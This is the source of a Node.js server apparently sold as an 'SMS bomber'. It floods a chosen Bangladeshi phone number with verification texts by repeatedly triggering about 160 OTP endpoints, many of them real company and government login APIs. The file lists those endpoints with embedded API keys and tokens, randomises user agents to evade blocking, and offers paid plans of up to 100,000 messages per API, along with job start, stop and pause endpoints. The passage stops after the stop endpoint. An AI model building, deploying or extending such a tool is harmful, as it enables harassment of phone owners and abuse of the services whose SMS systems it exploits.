// ============================================================
// ULTIMATE POWERFUL SMS BOMBER V5.0 - FIXED
// Developer: TNEH GROUP
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

console.log(`🚀 Starting SMS Bomber V5.0 on port ${PORT}`);

// ============================================================
// মিডলওয়্যার
// ============================================================
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// স্ট্যাটিক ফাইল
app.use(express.static(path.join(__dirname, '../public')));

// ============================================================
// ডেভেলপার ইনফো
// ============================================================
const DEVELOPER_INFO = {
  developer: "TNEH GROUP",
  telegram: "@tneh_owner",
  website: "https://tnehboomber.onrender.com",
  api_version: "5.0.0-FIXED",
  build_date: new Date().toISOString()
};

// ============================================================
// ইউটিলিটি ফাংশন
// ============================================================
const Utility = {
  generateId: () => crypto.randomBytes(16).toString('hex'),
  
  generateJobId: () => {
    return `JOB_${Date.now()}_${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
  },

  generateApiKey: () => {
    const prefix = 'TNEH';
    const random = crypto.randomBytes(16).toString('hex').toUpperCase();
    const timestamp = Date.now().toString(36).toUpperCase();
    return `${prefix}_${random}_${timestamp}`;
  },

  getCurrentTime: () => {
    return new Date().toLocaleTimeString('en-US', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
  },

  getISOString: () => new Date().toISOString(),

  sleep: (ms) => new Promise(resolve => setTimeout(resolve, ms)),

  maskPhone: (phone) => {
    if (!phone || phone.length < 7) return '***';
    return phone.slice(0, 3) + '****' + phone.slice(-3);
  },

  parsePhone: (phone) => phone.replace(/[^0-9]/g, ''),

  isValidPhone: (phone) => {
    const clean = Utility.parsePhone(phone);
    return /^(01|8801)[0-9]{9}$/.test(clean);
  },

  getRandomElement: (arr) => arr[Math.floor(Math.random() * arr.length)],

  shuffleArray: (arr) => {
    for (let i = arr.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    return arr;
  },

  getMemoryUsage: () => {
    const usage = process.memoryUsage();
    return {
      rss: (usage.rss / 1024 / 1024).toFixed(2) + ' MB',
      heapTotal: (usage.heapTotal / 1024 / 1024).toFixed(2) + ' MB',
      heapUsed: (usage.heapUsed / 1024 / 1024).toFixed(2) + ' MB'
    };
  }
};

// ============================================================
// ইউজার এজেন্ট লিস্ট
// ============================================================
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0'
];

function getRandomHeaders() {
  return {
    'User-Agent': Utility.getRandomElement(USER_AGENTS),
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
  };
}

// ============================================================
// কনফিগারেশন
// ============================================================
const CONFIG = {
  batchSize: 25,
  parallelRequests: 20,
  timeout: 8000,
  maxRetries: 3,
  retryDelay: 200,
  maxCountPerAPI: 100,
  stopCheckInterval: 100 // প্রতি 100ms পর স্টপ চেক
};

// ============================================================
// বোম্ব কন্ট্রোলার - ফিক্সড
// ============================================================
class BombController {
  constructor() {
    this.activeJobs = new Map();
    this.pausedJobs = new Map();
    this.completedJobs = new Map();
    this.jobCounter = 0;
    this.globalPause = false;
    this.globalStop = false;
    this.stats = {
      totalJobs: 0,
      totalSMS: 0,
      totalSuccess: 0,
      totalFailed: 0,
      startTime: Date.now()
    };
    console.log('✅ BombController initialized');
  }

  registerJob(phone, totalCount, options = {}) {
    const jobId = Utility.generateJobId();
    const job = {
      id: jobId,
      phone: phone,
      maskedPhone: Utility.maskPhone(phone),
      totalCount: totalCount,
      sentCount: 0,
      successCount: 0,
      failCount: 0,
      startTime: Date.now(),
      status: 'active',
      options: options,
      progress: 0,
      errors: [],
      lastUpdate: Date.now(),
      stopped: false,
      paused: false
    };
    
    this.activeJobs.set(jobId, job);
    this.jobCounter++;
    this.stats.totalJobs++;
    console.log(`📝 Job registered: ${jobId}`);
    return jobId;
  }

  isJobActive(jobId) {
    if (this.globalStop) {
      console.log(`🛑 Global stop is active`);
      return false;
    }
    if (this.globalPause) {
      console.log(`⏸️ Global pause is active`);
      return false;
    }
    const job = this.activeJobs.get(jobId);
    if (!job) return false;
    if (job.stopped) return false;
    if (job.paused) return false;
    return job.status === 'active';
  }

  // ===== স্টপ ফাংশন =====
  stopJob(jobId) {
    console.log(`🛑 Stopping job: ${jobId}`);
    const job = this.activeJobs.get(jobId);
    if (job) {
      job.stopped = true;
      job.status = 'stopped';
      job.endTime = Date.now();
      this.activeJobs.delete(jobId);
      this.completedJobs.set(jobId, job);
      console.log(`✅ Job stopped: ${jobId}`);
      return true;
    }
    
    // পজড জব চেক
    const pausedJob = this.pausedJobs.get(jobId);
    if (pausedJob) {
      pausedJob.stopped = true;
      pausedJob.status = 'stopped';
      pausedJob.endTime = Date.now();
      this.pausedJobs.delete(jobId);
      this.completedJobs.set(jobId, pausedJob);
      console.log(`✅ Paused job stopped: ${jobId}`);
      return true;
    }
    
    console.log(`❌ Job not found: ${jobId}`);
    return false;
  }

  // ===== পজ ফাংশন =====
  pauseJob(jobId) {
    console.log(`⏸️ Pausing job: ${jobId}`);
    const job = this.activeJobs.get(jobId);
    if (job && job.status === 'active' && !job.stopped) {
      job.paused = true;
      job.status = 'paused';
      this.activeJobs.delete(jobId);
      this.pausedJobs.set(jobId, job);
      console.log(`✅ Job paused: ${jobId}`);
      return true;
    }
    console.log(`❌ Cannot pause job: ${jobId}`);
    return false;
  }

  // ===== রিজিউম ফাংশন =====
  resumeJob(jobId) {
    console.log(`▶️ Resuming job: ${jobId}`);
    const job = this.pausedJobs.get(jobId);
    if (job && !job.stopped) {
      job.paused = false;
      job.status = 'active';
      this.pausedJobs.delete(jobId);
      this.activeJobs.set(jobId, job);
      console.log(`✅ Job resumed: ${jobId}`);
      return true;
    }
    console.log(`❌ Cannot resume job: ${jobId}`);
    return false;
  }

  // ===== সব স্টপ =====
  stopAllJobs() {
    console.log(`🛑 Stopping all jobs...`);
    this.globalStop = true;
    const jobs = Array.from(this.activeJobs.keys());
    let count = 0;
    jobs.forEach(id => {
      if (this.stopJob(id)) count++;
    });
    // পজড জবগুলোও স্টপ
    const pausedJobs = Array.from(this.pausedJobs.keys());
    pausedJobs.forEach(id => {
      if (this.stopJob(id)) count++;
    });
    console.log(`✅ Stopped ${count} jobs`);
    return count;
  }

  // ===== সব পজ =====
  pauseAllJobs() {
    console.log(`⏸️ Pausing all jobs...`);
    this.globalPause = true;
    const jobs = Array.from(this.activeJobs.keys());
    let count = 0;
    jobs.forEach(id => {
      if (this.pauseJob(id)) count++;
    });
    console.log(`✅ Paused ${count} jobs`);
    return count;
  }

  // ===== সব রিজিউম =====
  resumeAllJobs() {
    console.log(`▶️ Resuming all jobs...`);
    this.globalPause = false;
    this.globalStop = false;
    const jobs = Array.from(this.pausedJobs.keys());
    let count = 0;
    jobs.forEach(id => {
      if (this.resumeJob(id)) count++;
    });
    console.log(`✅ Resumed ${count} jobs`);
    return count;
  }

  updateJobStats(jobId, success, error = null) {
    const job = this.activeJobs.get(jobId);
    if (job && !job.stopped && !job.paused) {
      job.sentCount++;
      if (success) {
        job.successCount++;
        this.stats.totalSuccess++;
      } else {
        job.failCount++;
        this.stats.totalFailed++;
        if (error) {
          job.errors.push({
            timestamp: Date.now(),
            error: error
          });
        }
      }
      job.progress = ((job.sentCount / job.totalCount) * 100).toFixed(2);
      job.lastUpdate = Date.now();
      this.stats.totalSMS++;
      
      if (job.sentCount >= job.totalCount) {
        job.status = 'completed';
        job.endTime = Date.now();
        this.activeJobs.delete(jobId);
        this.completedJobs.set(jobId, job);
      }
    }
  }

  getJobStatus(jobId) {
    const job = this.activeJobs.get(jobId) || 
                this.pausedJobs.get(jobId) || 
                this.completedJobs.get(jobId);
    if (!job) return null;
    
    return {
      id: job.id,
      phone: job.maskedPhone,
      total: job.totalCount,
      sent: job.sentCount,
      success: job.successCount,
      fail: job.failCount,
      progress: job.progress + '%',
      status: job.status,
      startTime: job.startTime,
      endTime: job.endTime || null,
      duration: job.endTime ? ((job.endTime - job.startTime) / 1000).toFixed(2) + 's' : null,
      stopped: job.stopped || false,
      paused: job.paused || false,
      errors: job.errors ? job.errors.slice(-5) : []
    };
  }

  getAllJobs() {
    const jobs = [];
    
    this.activeJobs.forEach(job => {
      jobs.push({
        ...this.getJobStatus(job.id),
        status: 'active'
      });
    });
    
    this.pausedJobs.forEach(job => {
      jobs.push({
        ...this.getJobStatus(job.id),
        status: 'paused'
      });
    });
    
    this.completedJobs.forEach(job => {
      jobs.push({
        ...this.getJobStatus(job.id),
        status: job.status
      });
    });
    
    return jobs;
  }

  getStats() {
    return {
      totalJobs: this.stats.totalJobs,
      totalSMS: this.stats.totalSMS,
      totalSuccess: this.stats.totalSuccess,
      totalFailed: this.stats.totalFailed,
      successRate: this.stats.totalSMS > 0 
        ? ((this.stats.totalSuccess / this.stats.totalSMS) * 100).toFixed(2) + '%'
        : '0%',
      activeJobs: this.activeJobs.size,
      pausedJobs: this.pausedJobs.size,
      completedJobs: this.completedJobs.size,
      globalPause: this.globalPause,
      globalStop: this.globalStop,
      uptime: ((Date.now() - this.stats.startTime) / 1000).toFixed(2) + 's',
      memoryUsage: Utility.getMemoryUsage()
    };
  }

  clearCompleted() {
    const count = this.completedJobs.size;
    this.completedJobs.clear();
    return count;
  }
}

// ============================================================
// API ডেফিনেশন - 160 টি API
// ============================================================
const ORIGINAL_APIS = [
  { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
  { id: 2, name: "Grameenphone MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
  { id: 3, name: "Shukhee.com", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
  { id: 4, name: "MedEasy Health", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 5, name: "Ultranet API", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
  { id: 6, name: "eCourier API", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { id: 7, name: "Binge.buzz (GET)", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
  { id: 8, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  { id: 9, name: "Deshal.net", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
  { id: 10, name: "Grameenphone Web Login", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
  { id: 11, name: "Grameenphone (FWA/Bkash)", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
  { id: 12, name: "BusBD.com.bd", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: {"phone": "+88{phone}"} },
  { id: 13, name: "Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"} },
  { id: 14, name: "OsudPotro.com", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"} },
  { id: 15, name: "Apex4u.com", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: {"phoneNumber": "{phone}"} },
  { id: 16, name: "Bohubrihi.com", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: {"phone": "{phone}", "intent": "login"} },
  { id: 17, name: "Fundesh.com.bd", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: {"msisdn": "{phone}"} },
  { id: 18, name: "Jatri / JSLGlobal", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"} },
  { id: 19, name: "RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: {"mobile": "+88{phone}"} },
  { id: 20, name: "RabbitHoleBD", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: {"mobile": "+88{phone}"} },
  { id: 21, name: "Qcoom.com", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: {"mobileNumber": "+88{phone}"} },
  { id: 22, name: "Garibookadmin.com", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"} },
  { id: 23, name: "Training.gov.bd", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: {"mobile": "{phone}"} },
  { id: 24, name: "Shikho.com (Intent-1)", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: {"phone": "{phone}", "intent": "ap-discount-request"} },
  { id: 25, name: "Easy.com.bd", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..."} },
  { id: 26, name: "Robi (DA API)", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: {"msisdn": "{phone}"} },
  { id: 27, name: "Hoichoi (Viewlift)", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true} },
  { id: 28, name: "Addatimes.com", method: "POST", url: "https://app.addatimes.com/api/login", body: {"phone": "{phone}", "country_code": "BD"} },
  { id: 29, name: "Regal Furniture", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: {"phone": "{phone}", "verification_code": ""} },
  { id: 30, name: "DeeptoPlay.com", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"} },
  { id: 31, name: "TimezoneBD", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: {"phone": "{phone}"} },
  { id: 32, name: "UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: {"device_uuid": "...", "firebase_token": "...", "geo_location": "...", "mno": "Grameenphone", "wallet_number": "{phone}"} },
  { id: 33, name: "Chorki.com / Bioscopelive", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: {"number": "+880{phone}"} },
  { id: 34, name: "Arogga.com", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: {"mobile": "{phone}", "fcmToken": "", "referral": ""}, isFormData: true },
  { id: 35, name: "Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: {"mobileNum": "{phone}", "countryDialingCode": "880"} },
  { id: 36, name: "AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: {"msisdn": "880{phone}"} },
  { id: 37, name: "Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: {"Name": "Abdullah Al Mamun", "Phone": "+880{phone}"} },
  { id: 38, name: "Ghoori Learning", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: {"mobile_no": "{phone}"} },
  { id: 39, name: "Jayabaji BD", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: {"mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"} },
  { id: 40, name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: {"phone": "{phone}"} },
  { id: 41, name: "BdTickets.com", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: {"phone": "+880{phone}"} },
  { id: 42, name: "Binge.buzz (POST)", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: {"mobile": "{phone}"} },
  { id: 43, name: "SendMySMS", method: "POST", url: "https://sendmysms.net/send-otp.php", body: {"phonenumber": "{phone}"}, isFormData: true },
  { id: 44, name: "Shikho.com (Intent-2)", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: {"auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student"} },
  { id: 45, name: "Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: {"method": "otp", "mobile": "{phone}"} },
  { id: 46, name: "NESCO SSL Wireless", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: {"phone_number": "{phone}"} },
  { id: 47, name: "Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: {"country_code": "+880", "phone": "{phone}"} },
  { id: 48, name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 49, name: "Bioscopelive (Alternative)", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 50, name: "ShadowX API", method: "GET", url: "https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}", isShadowX: true }
];

// LMNx9 APIs (51-160)
for (let i = 1; i <= 110; i++) {
  ORIGINAL_APIS.push({
    id: 50 + i,
    name: `LMNx9 API${i}`,
    method: "GET",
    url: `https://lmnx9-sms-spam-v11.onrender.com/api${i}?number={phone}`,
    isLMNx9: true
  });
}

const SMS_APIS = ORIGINAL_APIS;

// ============================================================
// প্ল্যান কনফিগারেশন
// ============================================================
const PLAN_CONFIG = {
  default: { maxCount: 300, requiresKey: false, description: "Default - 300 SMS/API" },
  free: { maxCount: 50, requiresKey: false, description: "Free - 50 SMS/API" },
  premium: { maxCount: 10000, requiresKey: true, description: "Premium - 10,000 SMS/API" },
  enterprise: { maxCount: 50000, requiresKey: true, description: "Enterprise - 50,000 SMS/API" },
  unlimited: { maxCount: 100000, requiresKey: true, description: "Unlimited - 100,000 SMS/API" }
};

// ============================================================
// কী ম্যানেজমেন্ট
// ============================================================
const KEYS_FILE = path.join(__dirname, 'keys.json');

function loadKeys() {
  try {
    if (fs.existsSync(KEYS_FILE)) {
      const data = fs.readFileSync(KEYS_FILE, 'utf8');
      const parsed = JSON.parse(data);
      const keysMap = new Map();
      Object.entries(parsed).forEach(([key, value]) => {
        keysMap.set(key, new Date(value));
      });
      return keysMap;
    }
  } catch (error) {
    console.error('Error loading keys:', error.message);
  }
  return new Map();
}

let validKeys = loadKeys();

function saveKeys() {
  try {
    const obj = {};
    for (const [key, value] of validKeys.entries()) {
      obj[key] = value.toISOString();
    }
    fs.writeFileSync(KEYS_FILE, JSON.stringify(obj, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving keys:', error.message);
    return false;
  }
}

function isKeyValid(key) {
  if (!validKeys.has(key)) return false;
  const expiryDate = validKeys.get(key);
  return new Date() < expiryDate;
}

// ============================================================
// বোম্ব কন্ট্রোলার ইনস্ট্যান্স
// ============================================================
const bombController = new BombController();

// ============================================================
// স্মার্ট ডেলি সিস্টেম
// ============================================================
const apiDelays = new Map();
const lastRequestTime = new Map();
const successRates = new Map();
const requestCounts = new Map();

async function waitIfNeeded(apiId) {
  const now = Date.now();
  const last = lastRequestTime.get(apiId) || 0;
  let delay = apiDelays.get(apiId) || 100;
  
  const successRate = successRates.get(apiId) || 0.8;
  const count = requestCounts.get(apiId) || 0;
  
  if (count > 10) {
    if (successRate < 0.5) {
      delay = Math.min(delay + 20, 500);
    } else if (successRate > 0.9) {
      delay = Math.max(delay - 5, 30);
    }
    apiDelays.set(apiId, delay);
  }
  
  if (now - last < delay) {
    await Utility.sleep(delay - (now - last));
  }
  
  lastRequestTime.set(apiId, Date.now());
}

function updateStats(apiId, success) {
  const count = (requestCounts.get(apiId) || 0) + 1;
  requestCounts.set(apiId, count);
  
  const current = successRates.get(apiId) || 0;
  const newRate = ((current * (count - 1)) + (success ? 1 : 0)) / count;
  successRates.set(apiId, newRate);
}

// ============================================================
// API কল ফাংশন
// ============================================================
function replacePhoneNumber(data, phone, count = 1) {
  if (typeof data === 'string') {
    return data.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
  } else if (typeof data === 'object' && data !== null) {
    const result = {};
    for (const [key, value] of Object.entries(data)) {
      if (typeof value === 'string') {
        result[key] = value.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
      } else {
        result[key] = value;
      }
    }
    return result;
  }
  return data;
}

async function callSingleAPI(api, phone, jobId, attempt = 0) {
  // চেক করুন জব এখনও একটিভ কিনা
  if (!bombController.isJobActive(jobId)) {
    return {
      success: false,
      api_id: api.id,
      api_name: api.name,
      error: 'Job stopped or paused',
      stopped: true
    };
  }

  await waitIfNeeded(api.id);
  
  try {
    const cleanPhone = Utility.parsePhone(phone);
    let formattedPhone = cleanPhone;
    if (api.isShadowX || api.isLMNx9) {
      if (formattedPhone.startsWith('880')) {
        formattedPhone = formattedPhone.substring(3);
      }
    }
    
    const url = replacePhoneNumber(api.url, formattedPhone, 1);
    const headers = getRandomHeaders();
    
    let config = {
      method: api.method,
      url: url,
      headers: headers,
      timeout: CONFIG.timeout
    };

    if (api.method === 'POST' && api.body) {
      const body = replacePhoneNumber(api.body, formattedPhone, 1);
      if (api.isFormData) {
        config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        config.data = new URLSearchParams(body).toString();
      } else {
        config.data = body;
      }
    }

    const response = await axios(config);
    updateStats(api.id, true);
    
    return {
      success: true,
      api_id: api.id,
      api_name: api.name,
      status: response.status
    };
    
  } catch (error) {
    updateStats(api.id, false);
    
    if (attempt < CONFIG.maxRetries && bombController.isJobActive(jobId)) {
      await Utility.sleep(CONFIG.retryDelay * (attempt + 1));
      return callSingleAPI(api, phone, jobId, attempt + 1);
    }
    
    return {
      success: false,
      api_id: api.id,
      api_name: api.name,
      error: error.message,
      status: error.response?.status || null
    };
  }
}

// ============================================================
// সেন্ড ব্যাচ - স্টপ চেক সহ
// ============================================================
async function sendBatch(apis, phone, countPerApi, jobId) {
  const results = [];
  const actualCount = Math.min(countPerApi, CONFIG.maxCountPerAPI);
  const BATCH_SIZE = CONFIG.parallelRequests;
  
  const shuffledAPIs = Utility.shuffleArray([...apis]);
  let totalSent = 0;
  
  for (let i = 0; i < shuffledAPIs.length; i += BATCH_SIZE) {
    // স্টপ চেক
    if (!bombController.isJobActive(jobId)) {
      console.log(`⏹️ Job ${jobId} stopped by user at batch ${i/BATCH_SIZE}`);
      break;
    }
    
    const batch = shuffledAPIs.slice(i, i + BATCH_SIZE);
    
    const batchPromises = batch.map(async (api) => {
      const apiResults = [];
      const promises = [];
      
      for (let j = 0; j < actualCount; j++) {
        // প্রতি কলের আগে স্টপ চেক
        if (!bombController.isJobActive(jobId)) break;
        promises.push(callSingleAPI(api, phone, jobId));
      }
      
      const responses = await Promise.all(promises);
      const successCount = responses.filter(r => r.success).length;
      const failCount = responses.filter(r => !r.success).length;
      
      responses.forEach(r => {
        if (!r.stopped) {
          bombController.updateJobStats(jobId, r.success, r.error);
        }
      });
      
      return {
        api_id: api.id,
        api_name: api.name,
        method: api.method,
        total_attempts: responses.length,
        successful: successCount,
        failed: failCount,
        results: responses
      };
    });
    
    const batchResults = await Promise.all(batchPromises);
    results.push(...batchResults);
    
    // ব্যাচের মধ্যে ডেলি
    if (i + BATCH_SIZE < shuffledAPIs.length) {
      await Utility.sleep(100);
    }
  }
  
  return results;
}

// ============================================================
// API এন্ডপয়েন্টসমূহ
// ============================================================

// ===== রুট =====
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// ===== API ইনফো =====
app.get('/api', (req, res) => {
  res.json({
    developer: DEVELOPER_INFO,
    version: "5.0.0-FIXED",
    total_apis: SMS_APIS.length,
    plans: Object.keys(PLAN_CONFIG).reduce((acc, key) => {
      acc[key] = {
        max_count: PLAN_CONFIG[key].maxCount,
        requires_key: PLAN_CONFIG[key].requiresKey,
        description: PLAN_CONFIG[key].description
      };
      return acc;
    }, {}),
    endpoints: {
      spam: "/api/spam?number=017XXXXXXXX&count=300",
      stop: "/api/stop?jobId=JOB_ID or ?all=true",
      pause: "/api/pause?jobId=JOB_ID or ?all=true",
      resume: "/api/resume?jobId=JOB_ID or ?all=true",
      status: "/api/status",
      stats: "/api/stats",
      health: "/api/health"
    }
  });
});

// ============================================================
// ⭐ স্প্যাম এন্ডপয়েন্ট
// ============================================================
app.get('/api/spam', async (req, res) => {
  const { plan, number, count = 1, key } = req.query;
  
  let currentPlan = 'default';
  let planConfig = PLAN_CONFIG.default;
  
  if (plan && PLAN_CONFIG[plan]) {
    currentPlan = plan;
    planConfig = PLAN_CONFIG[plan];
  }
  
  if (planConfig.requiresKey) {
    if (!key || !isKeyValid(key)) {
      return res.status(401).json({
        success: false,
        error: 'Valid API key required for this plan',
        developer: DEVELOPER_INFO,
        generate_key: '/api/expiredate=30&createkey'
      });
    }
  }
  
  if (!number) {
    return res.status(400).json({
      success: false,
      error: 'Missing number parameter',
      developer: DEVELOPER_INFO
    });
  }
  
  const cleanNumber = Utility.parsePhone(number);
  if (!Utility.isValidPhone(cleanNumber)) {
    return res.status(400).json({
      success: false,
      error: 'Invalid phone number. Use format: 017XXXXXXXX',
      developer: DEVELOPER_INFO
    });
  }
  
  let perApiCount = parseInt(count);
  if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
  if (perApiCount > planConfig.maxCount) {
    return res.status(400).json({
      success: false,
      error: `Count exceeds ${currentPlan} plan limit (${planConfig.maxCount})`,
      developer: DEVELOPER_INFO
    });
  }
  
  const totalSMS = SMS_APIS.length * perApiCount;
  const jobId = bombController.registerJob(cleanNumber, totalSMS, {
    plan: currentPlan,
    perApiCount: perApiCount
  });
  
  console.log(`📱 [${currentPlan.toUpperCase()}] JOB ${jobId}: ${perApiCount}x${SMS_APIS.length} SMS to ${Utility.maskPhone(cleanNumber)}`);
  
  // অ্যাসিঙ্ক্রোনাস প্রসেসিং
  (async () => {
    try {
      const results = await sendBatch(SMS_APIS, cleanNumber, perApiCount, jobId);
      console.log(`✅ JOB ${jobId} completed!`);
    } catch (error) {
      console.error(`❌ JOB ${jobId} failed:`, error.message);
      bombController.stopJob(jobId);
    }
  })();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    jobId: jobId,
    plan: currentPlan,
    plan_description: planConfig.description,
    target_number: Utility.maskPhone(cleanNumber),
    per_api_count: perApiCount,
    total_apis: SMS_APIS.length,
    total_sms: totalSMS,
    status: 'started',
    message: 'Bombing started',
    stop_endpoint: `/api/stop?jobId=${jobId}`,
    status_endpoint: `/api/status?jobId=${jobId}`
  });
});

// ============================================================
// ⭐ স্টপ এন্ডপয়েন্ট - ফিক্সড
// ============================================================
app.get('/api/stop', (req, res) => {
  const { jobId, all } = req.query;
  
  console.log(`🛑 Stop request received: jobId=${jobId}, all=${all}`);
  
  // সব জব স্টপ
  if (all === 'true' || all === '1' || all === '') {
    const count = bombController.stopAllJobs();
    return res.json({
      success: true,
      message: `Stopped ${count} active jobs`,
      developer: DEVELOPER_INFO,
      stopped_count: count,
      timestamp: Utility.getISOString()
    });
  }
  
  // নির্দিষ্ট জব স্টপ
  if (jobId) {
    const success = bombController.stopJob(jobId);
    if (success) {
      return res.json({
        success: true,
        message: `Job ${jobId} stopped successfully`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        timestamp: Utility.getISOString()
      });
    } else {
      return res.status(404).json({
        success: false,
        error: `Job ${jobId} not found or already completed`,
        developer: DEVELOPER_INFO,
        available_jobs: bombController.getAllJobs().map(j => ({ id: j.id, status: j.status }))
      });
    }
  }
  
  // প্যারামিটার নেই
  return res.status(400).json({
    success: false,
    error: 'Missing jobId or all parameter',
    developer: DEVELOPER_INFO,
    usage: '/api/stop?jobId=JOB_ID or /api/stop?all=true',
    active_jobs: bombController.getAllJobs().map(j => ({ id: j.id, status: j.status }))
  });
});

// ============================================================
